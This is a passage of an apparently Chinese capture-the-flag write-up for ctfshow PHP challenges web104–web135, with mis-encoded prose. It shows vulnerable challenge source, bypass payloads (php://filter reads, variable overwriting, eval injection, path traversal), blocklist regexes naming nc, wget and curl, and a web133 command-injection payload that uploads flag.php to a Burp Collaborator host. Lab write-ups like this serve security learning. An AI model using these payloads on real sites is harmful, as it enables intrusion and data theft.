$_GET[&#39;v2&#39;];    if(sha1($v1)&#x3D;&#x3D;sha1($v2))&#123;        echo $flag;    &#125;&#125;</code></pre><p>å¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥æ‰¾ä¸ªå‰å‡ ä½æ•°å­—ä¸€æ ·çš„</p><h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505212724685.png" alt="image-20220505212724685"></p><p>å˜é‡è¦†ç›–ï¼Œget suces=flagå</p><p>$suces=$flag</p><p>post error=suceså</p><p>$error=$suces</p><p>ä¹Ÿå°±æ˜¯$error=$flagï¼Œåœ¨ç»è¿‡ifåˆ¤æ–­çš„æ—¶å€™é€šè¿‡dieå‡½æ•°å°±ä¼šæ˜¾ç¤ºflag</p><h2 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505213442076.png" alt="image-20220505213442076"></p><p>è·Ÿ104å·®ä¸å¤š</p><h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505214133528.png" alt="image-20220505214133528"></p><p>æ•´ç‚¹ç©ºæ•°ç»„ç»•è¿‡(è™½ç„¶ä¸Šè¾¹è¿™ä¸ªæœ‰ç‚¹é—®é¢˜ï¼Œä½†æ˜¯è¿‡äº†å°±è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505214920530.png" alt="image-20220505214920530"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505214149572.png" alt="image-20220505214149572"></p><p>è¿˜æœ‰å…¶ä»–çš„æ–¹æ³•</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505214423673.png" alt="image-20220505214423673"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505214535301.png" alt="image-20220505214535301"></p><h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#39;c&#39;])&#x3D;&#x3D;&#x3D;FALSE)  &#123;    die(&#39;error&#39;);&#125;&#x2F;&#x2F;åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flagif(intval(strrev($_GET[&#39;c&#39;]))&#x3D;&#x3D;0x36d)&#123;    echo $flag;&#125;</code></pre><p><strong>ereg()</strong></p><p>æ­£åˆ™åŒ¹é…çš„ä¸€ç§ï¼Œå­˜åœ¨NULLæˆªæ–­æ¼æ´ï¼Œå¯¼è‡´æ­£åˆ™è¿‡æ»¤è¢«ç»•è¿‡ï¼Œå¯ä»¥ä½¿ç”¨%00æˆªæ–­æ­£åˆ™åŒ¹é…</p><p><strong>strrev()</strong></p><p>å­—ç¬¦ä¸²é€†åºï¼Œ0x36dåè¿›åˆ¶ä¸º877ï¼Œé€†åºå³ä¸º778</p><p>æ•…å¯ä»¥æ„å»ºpayload</p><h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505215746759.png" alt="image-20220505215746759"></p><p>å½“æ–°å»ºReflectionClassç±»å¹¶ä¼ å…¥PHPä»£ç æ—¶ï¼Œä¼šè¿”å›ä»£ç çš„è¿è¡Œç»“æœï¼Œå¯ä»¥é€šè¿‡<code>echo</code>æ˜¾ç¤º<br>å³ä½¿ä¼ å…¥äº†ç©ºçš„æ‹¬å·ï¼Œä»£ç ä¾æ—§å¯ä»¥è¿è¡Œï¼Œä¸”<code>error_reporting(0)</code>çš„å­˜åœ¨é˜»æ­¢äº†æŠ¥é”™</p><h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;    $v1 &#x3D; $_GET[&#39;v1&#39;];    $v2 &#x3D; $_GET[&#39;v2&#39;];    if(preg_match(&#39;&#x2F;\~|\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]&#x2F;&#39;, $v1))&#123;            die(&quot;error v1&quot;);    &#125;    if(preg_match(&#39;&#x2F;\~|\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]&#x2F;&#39;, $v2))&#123;            die(&quot;error v2&quot;);    &#125;    eval(&quot;echo new $v1($v2());&quot;);&#125;</code></pre><p>åˆ©ç”¨åŸç”Ÿç±»FilesystemIteratoré…åˆgetcwdæ¥è¯»æ–‡ä»¶ç›®å½•ï¼Œç„¶åç›´æ¥è®¿é—®å°±è¡Œäº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506180313118.png" alt="image-20220506180313118"></p><h2 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);function getFlag(&amp;$v1,&amp;$v2)&#123;    eval(&quot;$$v1 &#x3D; &amp;$$v2;&quot;);    var_dump($$v1);&#125;if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;    $v1 &#x3D; $_GET[&#39;v1&#39;];    $v2 &#x3D; $_GET[&#39;v2&#39;];    if(preg_match(&#39;&#x2F;\~| |\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]|\&lt;|\&gt;&#x2F;&#39;, $v1))&#123;            die(&quot;error v1&quot;);    &#125;    if(preg_match(&#39;&#x2F;\~| |\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]|\&lt;|\&gt;&#x2F;&#39;, $v2))&#123;            die(&quot;error v2&quot;);    &#125;        if(preg_match(&#39;&#x2F;ctfshow&#x2F;&#39;, $v1))&#123;            getFlag($v1,$v2);    &#125;&#125;</code></pre><p>åˆ©ç”¨å˜é‡è¦†ç›–è®©$ctfshow=å…¨å±€å˜é‡</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506180100307.png" alt="image-20220506180100307"></p><h2 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);error_reporting(0);function filter($file)&#123;    if(preg_match(&#39;&#x2F;\.\.\&#x2F;|http|https|data|input|rot13|base64|string&#x2F;i&#39;,$file))&#123;        die(&quot;hacker!&quot;);    &#125;else&#123;        return $file;    &#125;&#125;$file&#x3D;$_GET[&#39;file&#39;];if(! is_file($file))&#123;    highlight_file(filter($file));&#125;else&#123;    echo &quot;hacker!&quot;;&#125;</code></pre><p>filteråè®®ç›´æ¥è¯»ï¼Œæˆ–è€…ç”¨ä¸€äº›æ²¡è¢«è¿‡æ»¤çš„ç¼–ç </p><pre class="language-php" data-language="php"><code class="language-php">php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.phpphp:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;flag.phpphp:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.phpcompress.zlib:&#x2F;&#x2F;flag.php</code></pre><h2 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);error_reporting(0);function filter($file)&#123;    if(preg_match(&#39;&#x2F;filter|\.\.\&#x2F;|http|https|data|data|rot13|base64|string&#x2F;i&#39;,$file))&#123;        die(&#39;hacker!&#39;);    &#125;else&#123;        return $file;    &#125;&#125;$file&#x3D;$_GET[&#39;file&#39;];if(! is_file($file))&#123;    highlight_file(filter($file));&#125;else&#123;    echo &quot;hacker!&quot;;</code></pre><p>filterè¢«ç¦äº†ï¼Œå¯ä»¥æ¢ä¸€ä¸ª</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506174743375.png" alt="image-20220506174743375"></p><p>æˆ–è¿™åˆ©ç”¨å¤šæ¬¡é‡å¤ç»•è¿‡is_fileçš„åˆ¤æ–­</p><p>linuxé‡Œ<code>/proc/self/root</code>æ˜¯æŒ‡å‘æ ¹ç›®å½•çš„ï¼Œä¹Ÿå°±æ˜¯å¦‚æœåœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥<code>ls /proc/self/root</code>ï¼Œå…¶å®æ˜¾ç¤ºçš„å†…å®¹æ˜¯æ ¹ç›®å½•ä¸‹çš„å†…å®¹</p><pre class="language-php" data-language="php"><code class="language-php">payloadï¼š?file&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</code></pre><h2 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506180821666.png" alt="image-20220506180821666"></p><p>ä¸å¸¦ç¼–ç çš„filter</p><h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><pre class="language-php" data-language="php"><code class="language-php">include(&#39;flag.php&#39;);highlight_file(__FILE__);error_reporting(0);function filter($num)&#123;    $num&#x3D;str_replace(&quot;0x&quot;,&quot;1&quot;,$num);    $num&#x3D;str_replace(&quot;0&quot;,&quot;1&quot;,$num);    $num&#x3D;str_replace(&quot;.&quot;,&quot;1&quot;,$num);    $num&#x3D;str_replace(&quot;e&quot;,&quot;1&quot;,$num);    $num&#x3D;str_replace(&quot;+&quot;,&quot;1&quot;,$num);    return $num;&#125;$num&#x3D;$_GET[&#39;num&#39;];if(is_numeric($num) and $num!&#x3D;&#x3D;&#39;36&#39; and trim($num)!&#x3D;&#x3D;&#39;36&#39; and filter($num)&#x3D;&#x3D;&#39;36&#39;)&#123;    if($num&#x3D;&#x3D;&#39;36&#39;)&#123;        echo $flag;    &#125;else&#123;        echo &quot;hacker!!&quot;;    &#125;&#125;else&#123;    echo &quot;hacker!!!&quot;;&#125;</code></pre><p>åœ¨ä¸å½±å“æ•°å­—ç±»å‹çš„å‰æä¸‹èƒ½åŠ çš„å­—ç¬¦é™¤äº†æ•°å­—å’Œ+-.å·ä»¥å¤–è¿˜æœ‰ %09 %0a %0b %0c %0d %20ï¼Œtrimè¿‡æ»¤äº† %09 %0a %0b %0d %20ï¼Œæ‰€ä»¥åªå‰©ä¸‹%0cæ¢é¡µç¬¦äº†</p><p>payloadï¼š</p><p>num=%0c36</p><h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a&#x3D;$_SERVER[&#39;argv&#39;];$c&#x3D;$_POST[&#39;fun&#39;];if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;]))&#123;    if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\%|\^|\*|\-|\+|\&#x3D;|\&#123;|\&#125;|\&quot;|\&#39;|\,|\.|\;|\?&#x2F;&quot;, $c)&amp;&amp;$c&lt;&#x3D;18)&#123;         eval(&quot;$c&quot;.&quot;;&quot;);           if($fl0g&#x3D;&#x3D;&#x3D;&quot;flag_give_me&quot;)&#123;             echo $flag;         &#125;    &#125;&#125;</code></pre><p>PHPå˜é‡ååº”è¯¥åªæœ‰æ•°å­—å­—æ¯ä¸‹åˆ’çº¿,åŒæ—¶GETæˆ–POSTæ–¹å¼ä¼ è¿›å»çš„å˜é‡å,ä¼šè‡ªåŠ¨å°†ç©ºæ ¼+ . [è½¬æ¢ä¸º_</p><p>æ‰€ä»¥æˆ‘ä»¬æ²¡æœ‰åŠæ³•post CTF_SHOW.COMè¿›å»</p><p>è¿™é‡Œå°±ç”¨åˆ°äº†phpå˜é‡åç‰¹æ€§ç»•è¿‡</p><p>åœ¨å˜é‡åä¸­å‡ºç°äº†[çš„è¯ï¼Œåœ¨getã€postä¼ å‚ä¸­ï¼Œ[å°±ä¼šè¢«æ›¿æ¢æˆ_ï¼Œç„¶åå…¶åçš„å­—æ¯ä¸ä¼šå‘ç”Ÿå˜åŒ–ï¼ŒCTF[SHOW.COM=&gt;CTF_SHOW.COM</p><p>ç„¶åç›´æ¥è¾“å‡ºflagå˜é‡</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506183011845.png" alt="image-20220506183011845"></p><p>å†æ¥å‡ ä¸ªå…¶ä»–çš„</p><p>CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=var_export($GLOBALS)è¯»å–å…¨å±€å˜é‡</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506183352375.png" alt="image-20220506183352375"></p><pre class="language-php" data-language="php"><code class="language-php">payload:get:  $fl0g&#x3D;flag_give_me;post:  CTF_SHOW&#x3D;1&amp;CTF%5bSHOW.COM&#x3D;1&amp;fun&#x3D;eval($a[0])</code></pre><p>è¿™ç§å°±æ˜¯åœ¨evalé‡Œæ‰§è¡Œè¿™ä¸ªèµ‹å€¼è¯­å¥$fl0g=flag_give_me;å°±èƒ½æ»¡è¶³åè¾¹çš„åˆ¤æ–­è¾“å‡ºflag</p><p>ä¸‹é¢è¿™ä¸ªæ˜¯é¢„æœŸè§£</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506183835525.png" alt="image-20220506183835525"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506184715179.png" alt="image-20220506184715179"></p><h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a&#x3D;$_SERVER[&#39;argv&#39;];$c&#x3D;$_POST[&#39;fun&#39;];if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;]))&#123;    if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\%|\^|\*|\-|\+|\&#x3D;|\&#123;|\&#125;|\&quot;|\&#39;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print&#x2F;i&quot;, $c)&amp;&amp;$c&lt;&#x3D;16)&#123;         eval(&quot;$c&quot;.&quot;;&quot;);         if($fl0g&#x3D;&#x3D;&#x3D;&quot;flag_give_me&quot;)&#123;             echo $flag;         &#125;    &#125;&#125;?&gt;</code></pre><p>å¯ä»¥ç”¨123çš„é¢„æœŸè§£</p><p>æˆ–è€…åŒ…å«ä¸€ä¸‹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506185355334.png" alt="image-20220506185355334"></p><h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a&#x3D;$_SERVER[&#39;argv&#39;];$c&#x3D;$_POST[&#39;fun&#39;];if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;]))&#123;    if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\%|\^|\*|\-|\+|\&#x3D;|\&#123;|\&#125;|\&quot;|\&#39;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d&#x2F;i&quot;, $c) &amp;&amp; strlen($c)&lt;&#x3D;16)&#123;         eval(&quot;$c&quot;.&quot;;&quot;);           if($fl0g&#x3D;&#x3D;&#x3D;&quot;flag_give_me&quot;)&#123;             echo $flag;         &#125;    &#125;&#125;</code></pre><p>123çš„é¢„æœŸè§£è¿˜æ˜¯èƒ½ç”¨ï¼Œæˆ–è€…æ˜¯</p><pre class="language-php" data-language="php"><code class="language-php">?$fl0g&#x3D;flag_give_mePOST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;assert($a[0])&#x2F;&#x2F;å°±æ˜¯ç”¨assertæ›¿æ¢eval</code></pre><h2 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);$ctf_show &#x3D; md5($flag);$url &#x3D; $_SERVER[&#39;QUERY_STRING&#39;];&#x2F;&#x2F;ç‰¹æ®Šå­—ç¬¦æ£€æµ‹function waf($url)&#123;    if(preg_match(&#39;&#x2F;\&#96;|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#39;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\&#x2F;&#x2F;&#39;, $url))&#123;        return true;    &#125;else&#123;        return false;    &#125;&#125;if(waf($url))&#123;    die(&quot;å—¯å“¼ï¼Ÿ&quot;);&#125;else&#123;    extract($_GET);&#125;if($ctf_show&#x3D;&#x3D;&#x3D;&#39;ilove36d&#39;)&#123;    echo $flag;</code></pre><p>ä¸‹åˆ’çº¿è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨ç©ºæ ¼ä»£æ›¿</p><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">?ctf show&#x3D;ilove36d</code></pre><h2 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h2><p> _()æ˜¯ä¸€ä¸ªå‡½æ•°</p><p>_()==gettext() æ˜¯gettext()çš„æ‹“å±•å‡½æ•°ï¼Œå¼€å¯textæ‰©å±•ã€‚éœ€è¦phpæ‰©å±•ç›®å½•ä¸‹æœ‰php_gettext.dll</p><p>å½“phpå¼€å¯äº†gettextæ‰©å±•åï¼Œå¯ä»¥ç»•è¿‡å­—æ¯</p><pre class="language-none"><code class="language-none">echo gettext(phpinfo());&#x3D;&#x3D;&#x3D;echo _(phpinfo());</code></pre><p><strong>get_defined_vars()</strong></p><p>get_defined_vars â€” è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506200639084.png" alt="image-20220506200639084"></p><h2 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h2><pre class="language-php" data-language="php"><code class="language-php">f&#x3D;..&#x2F;ctfshow&#x2F;..&#x2F;html&#x2F;flag.php</code></pre><p>ç›®å½•ç©¿è¶Š</p><h2 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#39;f&#39;]))&#123;    $f &#x3D; $_POST[&#39;f&#39;];    if(preg_match(&#39;&#x2F;.+?ctfshow&#x2F;is&#39;, $f))&#123;        die(&#39;bye!&#39;);    &#125;    if(stripos($f, &#39;ctfshow&#39;) &#x3D;&#x3D;&#x3D; FALSE)&#123;        die(&#39;bye!!&#39;);    &#125;    echo $flag;&#125;</code></pre><p>åˆ©ç”¨preg_matchçš„å›æº¯é™åˆ¶ï¼Œå¦‚æœå›æº¯æ¬¡æ•°è¶…è¿‡äº† 100 ä¸‡ï¼Œpreg_match å°†ä¸å†è¿”å›é 1 å’Œ 0ï¼Œè€Œæ˜¯ falseã€‚</p><p>ä¹Ÿå¯ä»¥ç”¨æ•°ç»„ç»•è¿‡</p><p>ç¬¬äºŒä¸ªæ­£åˆ™åŒ¹é…æ˜¯å¼ºç­‰äºï¼Œç±»å‹å¿…é¡»ç›¸åŒ</p><p>é‡‡ç”¨<code>æ•°ç»„</code>ç»•è¿‡çš„æ–¹æ³•ï¼Œ<code>striposå‡½æ•°</code>ä¼šè¿”å›<code>null</code>,<code>null!=false</code>,æ‰€ä»¥å¯ä»¥ç»•è¿‡striposå‡½æ•°</p><h2 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h2><p>è·Ÿweb132å·®ä¸å¤šï¼Œå°±æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸èƒ½æ•°ç»„ç»•è¿‡ï¼Œåªèƒ½åˆ©ç”¨æœ€å¤§å›æº¯äº†</p><h2 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h2><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;username&#39;]) &amp;&amp; isset($_GET[&#39;password&#39;]) &amp;&amp; isset($_GET[&#39;code&#39;]))&#123;    $username &#x3D; (String)$_GET[&#39;username&#39;];    $password &#x3D; (String)$_GET[&#39;password&#39;];    $code &#x3D; (String)$_GET[&#39;code&#39;];    if($code &#x3D;&#x3D;&#x3D; mt_rand(1,0x36D) &amp;&amp; $password &#x3D;&#x3D;&#x3D; $flag || $username &#x3D;&#x3D;&#x3D;&quot;admin&quot;)&#123;                if($code &#x3D;&#x3D; &#39;admin&#39;)&#123;            echo $flag;        &#125;            &#125;&#125;</code></pre><p>è®©ifä¸ºçœŸåªè¦è®©username=adminå°±è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506203341551.png"></p><h2 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);highlight_file(__FILE__);&#x2F;&#x2F;flag.phpif($F &#x3D; @$_GET[&#39;F&#39;])&#123;    if(!preg_match(&#39;&#x2F;system|nc|wget|exec|passthru|netcat&#x2F;i&#39;, $F))&#123;        eval(substr($F,0,6));    &#125;else&#123;        die(&quot;6ä¸ªå­—æ¯éƒ½è¿˜ä¸å¤Ÿå‘€?!&quot;);    &#125;&#125;</code></pre><pre class="language-txt" data-language="txt"><code class="language-txt">getä¼ å‚   F&#x3D;&#96;$F &#96;;sleep 3ç»è¿‡substr($F,0,6)æˆªå–å å¾—åˆ°  &#96;$F &#96;;ä¹Ÿå°±æ˜¯ä¼šæ‰§è¡Œ eval(&quot;&#96;$F &#96;;&quot;);æˆ‘ä»¬æŠŠåŸæ¥çš„$Få¸¦è¿›å»eval(&quot;&#96;&#96;$F &#96;;sleep 3&#96;&quot;);ä¹Ÿå°±æ˜¯è¯´æœ€ç»ˆä¼šæ‰§è¡Œ  &#96;&#96;$F &#96;;sleep 3&#96; &#x3D;&#x3D; shell_exec(&quot;&#96;$F &#96;;sleep 3&quot;);å‰é¢çš„å‘½ä»¤æˆ‘ä»¬ä¸éœ€è¦ç®¡ï¼Œä½†æ˜¯åé¢çš„å‘½ä»¤æˆ‘ä»¬å¯ä»¥è‡ªç”±æ§åˆ¶ã€‚è¿™æ ·å°±åœ¨æœåŠ¡å™¨ä¸ŠæˆåŠŸæ‰§è¡Œäº† sleep 3</code></pre><p>ç„¶åå› ä¸ºæ²¡æœ‰å›æ˜¾ï¼Œå¯ä»¥é€šè¿‡curlå¤–å¸¦æ¥æŸ¥çœ‹<br>è¿™é‡Œå¯ä»¥ç”¨bpä¹Ÿå¯ä»¥ç”¨vps<br>curl -F å°†flagæ–‡ä»¶ä¸Šä¼ åˆ°Burpçš„ Collaborator Client ï¼ˆ Collaborator Client ç±»ä¼¼DNSLOGï¼Œå…¶åŠŸèƒ½è¦æ¯”DNSLOGå¼ºå¤§ï¼Œä¸»è¦ä½“ç°åœ¨å¯ä»¥æŸ¥çœ‹ POSTè¯·æ±‚åŒ…ä»¥åŠæ‰“Cookiesï¼‰</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506205540822.png" alt="image-20220506205540822"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506205559475.png" alt="image-20220506205559475"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506205834293.png" alt="image-20220506205834293"></p><pre class="language-none"><code class="language-none">?F&#x3D;&#96;$F&#96;;+curl -X POST -F xx&#x3D;@flag.php  http:&#x2F;&#x2F;8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net#å…¶ä¸­-F ä¸ºå¸¦æ–‡ä»¶çš„å½¢å¼å‘é€postè¯·æ±‚#xxæ˜¯ä¸Šä¼ æ–‡ä»¶çš„nameå€¼ï¼Œflag.phpå°±æ˜¯ä¸Šä¼ çš„æ–‡ä»¶ </code></pre><p>è¿˜å¯ä»¥åˆ©ç”¨cpå‘½ä»¤å°†flag.phpé‡Œçš„å†…å®¹å¤åˆ¶åˆ°ä¸€ä¸ªtxtå†…ï¼Œç„¶åç›´æ¥è®¿é—®</p><pre class="language-none"><code class="language-none">&#96;$F&#96; ;cp flag.php 1234.txt</code></pre><p>è¿˜å¯ä»¥dnslogå¤–å¸¦</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220507181310310.png" alt="image-20220507181310310"></p><h2 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);$key1 &#x3D; 0;$key2 &#x3D; 0;if(isset($_GET[&#39;key1&#39;]) || isset($_GET[&#39;key2&#39;]) || isset($_POST[&#39;key1&#39;]) || isset($_POST[&#39;key2&#39;])) &#123;    die(&quot;nonononono&quot;);&#125;@parse_str($_SERVER[&#39;QUERY_STRING&#39;]);extract($_POST);if($key1 &#x3D;&#x3D; &#39;36d&#39; &amp;&amp; $key2 &#x3D;&#x3D; &#39;36d&#39;) &#123;    die(file_get_contents(&#39;flag.php&#39;));&#125;</code></pre><p>ä¸èƒ½ä¼ å…¥key1ï¼Œkey2ï¼Œå¯ä»¥åˆ©ç”¨extractçš„å˜é‡è¦†ç›–ç»•è¿‡</p><p>$_SERVER[â€˜QUERY_STRINGâ€™]<br>è·å–æŸ¥è¯¢è¯­å¥ï¼Œå®ä¾‹ä¸­å¯çŸ¥ï¼Œè·å–çš„æ˜¯?åé¢çš„å€¼ï¼Œåªæœ‰getè¯·æ±‚</p><p>extract()<br>è¯¥å‡½æ•°æ˜¯å°†æ•°ç»„ä¸­çš„å€¼ä¾æ¬¡å¤åˆ¶ç»™$é”®=å€¼</p><p>parse_string()<br>å°†å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­</p><p>å¦‚æœæœªè®¾ç½® array å‚æ•°ï¼Œåˆ™ç”±è¯¥å‡½æ•°è®¾ç½®çš„å˜é‡å°†è¦†ç›–å·²å­˜åœ¨çš„åŒåå˜é‡ã€‚</p><p>payloadï¼š</p><pre class="language-php" data-language="php"><code class="language-php">?_POST[key1]&#x3D;36d&amp;_POST[key2]&#x3D;36d</code></pre><h2 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h2><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">error_reporting(0);highlight_file(__FILE__);&#x2F;&#x2F;flag.phpif($F &#x3D; @$_GET[&#39;F&#39;])&#123;    if(!preg_match(&#39;&#x2F;system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head&#x2F;i&#39;, $F))&#123;        eval(substr($F,0,6));    &#125;else&#123;        die(&quot;å¸ˆå‚…ä»¬å±…ç„¶ç ´è§£äº†å‰é¢çš„ï¼Œé‚£å°±æ¥ä¸€ä¸ªåŠ å¼ºç‰ˆå§&quot;);    &#125;&#125;</code></pre><ul><li>nlï¼Œcatï¼Œtacï¼Œmoreï¼Œlessï¼Œtailç­‰éƒ½å¯ä»¥è¯»æ–‡ä»¶</li><li>awkåŠ 